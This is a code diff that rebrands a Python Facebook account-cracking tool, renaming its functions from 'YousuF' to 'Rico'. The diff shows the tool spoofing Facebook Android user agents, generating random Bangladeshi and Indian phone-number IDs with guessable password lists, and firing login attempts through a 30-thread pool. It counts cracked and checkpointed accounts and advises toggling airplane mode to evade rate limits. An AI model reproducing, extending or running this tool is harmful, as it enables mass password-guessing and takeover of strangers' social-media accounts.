@@ -5,7 +5,7 @@ from os import system as osRUB
 from os import system as cmd
 from urllib.request import Request, urlopen
 import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
-from concurrent.futures import ThreadPoolExecutor as YousuFYousuF
+from concurrent.futures import ThreadPoolExecutor as RicoRico
 from string import * 
 from random import randint
 from time import sleep as slp
@@ -26,15 +26,15 @@ def ymfindua():
     ua = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; BLU Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.5,width=480,height=782};'+f'FBLC/en_US;FBRV;FBRV/{str(application_version_code)};FBCR/banglalink;FBMF/BLU;FBBD/BLU:FBBD;FBPN/{str(fbs)};FBDV/BLU DASH M2;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]'
     return ua
 #─━─━─━─━[User Agent]━─━─━─━─━#
-def yousuffile():
+def ricofile():
     END = 'Dalvik/2.1.0 (Linux; U; Android 13; LG-H735 Build/PPR1.182786.470) [FBAN/PAAA;FBAV/369.0.0.17.112;FBDM/{density=2.75,width=1080,height=2232};FBLC/en_GB;FBBV/386998368;FB_FW/2;FBSN/Android;FBDI/e5957a8c-deca-4bd4-8920-65893d290275;FBCR/NTT DOCOMO;FBMF/SHARP;FBBD/DOCOMO;FBDV/SH-54B;FBSV/12;FBCA/arm64-v8a:null;]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; LG-H735 Build/PPR1.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
-def yousuffile1():
+def ricoffile1():
     END = '[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
     ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 12; Armor X10 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10; LT600T Build/QKQ1.200216.002)","Dalvik/2.1.0 (Linux; U; Android 13; SHG07 Build/S116H)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/T3B2.230316.003)","Dalvik/2.1.0 (Linux; U; Android 5.1; Ixion ES350 Build/DEXP)","Dalvik/2.1.0 (Linux; U; Android 12; ELZ-AN20 Build/HONORELZ-AN20)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 20 pro Build/T1RA33.55-15-10)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_Z012DA Build/MMB29P)","Dalvik/2.1.0 (Linux; U; Android 11; BQru-6868L Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; TAB_912_PRO_4G Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; 22031116AI Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; O2 TV Box Build/QTT2.200720.001)","Dalvik/2.1.0 (Linux; U; Android 9; motorola one vision Build/PSA29.97-37)","Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PMAIN1.2992N)","Dalvik/2.1.0 (Linux; U; Android 13; M2101K6P Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 13; V2127 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; 23021RAAEG Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G950F Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 12; 100071485 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; SM-A505N Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 10.0; YT7260L Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Gtel X7plus Build/O11019)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; TPS550A Build/KTU84Q)","Dalvik/2.1.0 (Linux; U; Android 10; TC57 Build/10-16-10.00-QG-U133-STD-HEL-04)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2271 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; iris60c Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; GT-S7580 Build/LMY48Y)","Dalvik/2.1.0 (Linux; U; Android 7.0; SPYBOXSXMINI Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 11; K55g Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; V2065 Build/SP1A.210812.003)","Dalvik/2.1.0 (Linux; U; Android 11; E506 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 11; BNE-LX3 Build/HUAWEIBNE-LX3)","Dalvik/2.1.0 (Linux; U; Android 9; APEXA-A-1500 Build/PI)","Dalvik/2.1.0 (Linux; U; Android 9; DL3Plus Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.501VZ.0568.a)","Dalvik/2.1.0 (Linux; U; Android 9; VISIO TV Build/PTO7.210711.001)","Dalvik/2.1.0 (Linux; U; Android 9.0; PHILCO_ATV11 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 8 Build/TQ1A.230205.002)","Dalvik/2.1.0 (Linux; U; Android 12; RBN-NX1 Build/HONORRBN-N31)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one action Build/QSB30.62-17-17)","Dalvik/2.1.0 (Linux; U; Android 5.1; YU 6000 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; 23028RA60L Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 10; Note 7T Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 13; SM-G9880 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; T10W2 Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A346M Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; CORN X55 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; PO-10034 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 11; 2209116AG Build/RKQ1.200826.002)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; DroidBox Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 9; moto e(6) plus Build/PTAS29.401-25-3)","Dalvik/2.1.0 (Linux; U; Android 11; Motorola Defy Build/RZD31.31)","Dalvik/2.1.0 (Linux; U; Android 10; HEYOU20 Build/QKQ1.191008.001)","Dalvik/2.1.0 (Linux; U; Android 11; U55 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; px30_evb Build/OPM8.190505.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-3-1)","Dalvik/2.1.0 (Linux; U; Android 12; moto g72 Build/S3SVS32.45-28-2-2)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-1)","Dalvik/2.1.0 (Linux; U; Android 12; A003SH Build/S2010)","Dalvik/2.1.0 (Linux; U; Android 9; VOG-L04 Build/HUAWEIVOG-L04)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one 5G ace Build/QZKS30.Q4-40-64-14)","Dalvik/2.1.0 (Linux; U; Android 11; JAD-LX9 Build/HUAWEIJAD-L09)","Dalvik/2.1.0 (Linux; U; Android 12; V2202 Build/SP1A.210812.003_SC)","Dalvik/2.1.0 (Linux; U; Android 10.1; T99 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 11; Grundig Android UHD TV Build/RTM3.211215.227)","Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 9 Build/RQ2A.210505.003)","Dalvik/2.1.0 (Linux; U; Android 11; Black G Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; K6b Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 6.0; 4049G Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 7.1; GOLDTVPlus Build/NRD91N)","Dalvik/2.1.0 (Linux; U; Android 12; RKY-LX3 Build/HONORRKY-L33)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; G706 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 5.1; TIS001 Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 11; C60 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 10.0; B9212BF Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 6.0; W NEXT Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 9; Bmobile AX754 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; TIS_001 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; WS5SE Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; RKY-LX3 Build/HONORRKY-L03)","Dalvik/2.1.0 (Linux; U; Android 12; T776O Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SGINO6 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; KB2007 Build/RKQ1.211119.001)","Dalvik/2.1.0 (Linux; U; Android 11; ABR-LX9 Build/HUAWEIABR-L09)","Dalvik/2.1.0 (Linux; U; Android 11; NCO-LX3 Build/HUAWEINCO-LX3)","Dalvik/2.1.0 (Linux; U; Android 12; moto g51 5G Build/S2RYAS32.58-13-12-4)","Dalvik/2.1.0 (Linux; U; Android 13; SH-RM19s Build/S3067)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A047M Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; Black_Z Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; 22120RN86G Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; S10 Build/RP1A.201005.006)","Dalvik/2.1.0 (Linux; U; Android 11; DS502 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2365 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A135N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; I2207 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 5.0; W55SE Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 11; K58 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(60) Build/S2RIS32.32-20-9-7)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; GOA Build/KOT49H)",]) +END
     return ua
-def yousuf_ua():
+def rico_ua():
 	gtt=random.choice(['GT-I9190','KOT49H','GT-I9192','KOT49H','GT-I9300I','KTU84P','GT-I9300','IMM76D','GT-I9300','JSS15J','GT-I9301I','KOT4','GT-I9301I','KOT49H','GT-I9500','JDQ39','GT-I9500','LRX22C','GT-N5100','JZO54K','GT-N7100','KOT49H','GT-N8000','JZO54K','GT-N8000','KOT49H','GT-P3110','JZO54K','GT-P5100','IML74K','GT-P5100','JDQ','GT-P5100','JDQ39','GT-P5100','JZO54K','GT-P5110','JDQ39','GT-P5200','KOT49H','GT-P5210','KOT49H','GT-P5220','JDQ39','GT-S7390','JZO54K','SAMSUNG','SM-A500F','SAMSUNG','SM-G532F','SAMSUNG','SM-G920F','SAMSUNG','SM-G935F','SAMSUNG','SM-J320F','SAMSUNG','SM-J510FN','SAMSUNG','SM-N920S','SAMSUNG','SM-T280','SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M','SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H','LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39','SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H','SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','KTU84P','SM-T705','LRX22G','SM-T705','LRX22G','SM-T805','LRX22G','SM*T820','NRD90M','SPH-L720','KOT49H'])
 	END = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-J701F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/433.0.0.32.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/532438874;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBDV/SM-J701F;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;] FBBK/1'
 	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-J701F Build/PPR1.190305.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
@@ -143,7 +143,7 @@ def result(OKs,cps):
         input("\x1b[1;92m[•]\033[1;37m ━ \x1b[1;92mPRESS ENTER TO BACK  ")
         exit()
 #─━─━─━─━Main menu─━─━─━─━─#
-def YousuF():
+def Rico():
             os.system('clear')
             print(logo)
             print(f'\033[92;1m[\033[1;37mA\033[92;1m] \033[1;37mFILE CRACK ')
@@ -465,7 +465,7 @@ def admin():
 			linex()
 			YM=input(f'\033[92;1m[<+>]\033[1;37m SELECT OPTION   :\033[92;1m ')				
 			if YM in ['B','2']:os.system("xdg-open https://www.facebook.com/ajjajhs.jjwjwjdh.0 ")								
-			if YM in ['E','5']:YousuF()
+			if YM in ['E','5']:Rico()
 			else:
 				time.sleep(3)
 				admin()							
@@ -508,7 +508,7 @@ def rndbd():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(11))
         user.append(nmp)
-    with YousuFYousuF(max_workers=30) as YousuF:
+    with RicoRico(max_workers=30) as YousuF:
         clear()
         tl = str(len(user))
         print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m RANDOM CLONE\33[1;37m [BD] ')
@@ -530,7 +530,7 @@ def rndbd():
     print(f'\33[1;37m\33[1;32m TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
     linex()
     input(f'\33[1;37m\033[47m\033[1;30mPRESS ENTER TO BACK \033[40m\033[00m\033[1;37m ')
-    YousuF()
+    Rico()
 #─━─━──━Random sys ind─━─━──━─#
 def rndind():
     user=[]
@@ -553,22 +553,22 @@ def rndind():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    with YousuFYousuF(max_workers=30) as YousuF:
+    with RicoRico(max_workers=30) as Rico:
         clear()
         tl = str(len(user))
         print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m RANDOM CLONE\33[1;37m [IND] ')
         linex()      
         print(f"\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m SIM CODE \33[1;33m ────────➤\33[1;37m {code} \033[1;37m")
         print(f"\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m TOTAL ACCOUNTS\33[1;33m ───➤\33[1;37m {tl}")
-        print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m TRUN ON\033[91;1m AIRPLANE\x1b[1;92m MODE AFTER \033[1;37m4\x1b[1;92m MIN ')
+        print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m TURN ON\033[91;1m AIRPLANE\x1b[1;92m MODE AFTER \033[1;37m4\x1b[1;92m MIN ')
         linex()
         for love in user:
             pwx = [love[2:],love,code+love,code+love[:3],'57575751','57273200','59039200','57575751']
             ids = code+love
-            if mthdx in ['A','1']:YousuF.submit(rnd1,ids,pwx,tl)            	
-            if mthdx in ['B','2']:YousuF.submit(rnd2,ids,pwx,tl)          	
-            if mthdx in ['C','3']:YousuF.submit(graph,ids,pwx,tl)            	
-            if mthdx in ['D','4']:YousuF.submit(graph2,ids,pwx)                        	            
+            if mthdx in ['A','1']:Rico.submit(rnd1,ids,pwx,tl)            	
+            if mthdx in ['B','2']:Rico.submit(rnd2,ids,pwx,tl)          	
+            if mthdx in ['C','3']:Rico.submit(graph,ids,pwx,tl)            	
+            if mthdx in ['D','4']:Rico.submit(graph2,ids,pwx)                        	            
     print('\033[1;37m')
     linex()
     print(f'\33[1;37m\33[1;32m THE PROCESS HAS COMPLETED ')
@@ -620,7 +620,7 @@ def rndafg():
     print(f'\33[1;37m\33[1;32m TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
     linex()
     input(f'\33[1;37m\033[47m\033[1;30mPRESS ENTER TO BACK \033[40m\033[00m\033[1;37m ')
-    YousuF()
+    Rico()
 #─━─━──━Random sys NEP─━─━──━# 
 def rndnep():
     user=[]
@@ -704,7 +704,7 @@ def gmail():
     print(f'\33[1;37m\33[1;32m TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
     linex()
     input(f'\33[1;37m\033[47m\033[1;30mPRESS ENTER TO BACK ')
-    YousuF()
+    Rico()
 #─━─━─━─rndom-m1━─━─━─━─#
 def rnd1(ids,pwv,tl):
     global loop,oks,cps,twf
@@ -835,6 +835,6 @@ def rnd2(ids,pwv,tl):
         pass
 if __name__=="__main__":
     os.system('clear')
-    YousuF()
+    Rico()
 else:
-    YousuF()
+    Rico()
